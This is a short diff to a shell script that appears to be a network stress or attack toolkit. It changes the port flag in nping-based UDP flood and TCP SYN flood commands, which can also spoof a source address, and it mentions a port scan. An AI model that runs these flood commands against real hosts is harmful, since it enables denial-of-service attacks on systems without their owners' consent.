@@ -93,8 +93,8 @@ if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 	read DATA	
 		echo "Starting UDP Flood..."
 	if 	[ "$SOURCE" = "i" ]; then
-		sudo nping --udp -p $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
-	else sudo nping --udp -p $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+		sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
+	else sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
 	fi
 fi
 }
@@ -271,8 +271,8 @@ bannergrab()
 		: ${TOTAL:=100000}
 		echo "Starting TCP SYN Flood..."
 	if 	[ "$SOURCE" = "i" ]; then
-		sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
-	else sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
+	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
 	fi
 	fi
 ## TCP SYN Port Scan using nc
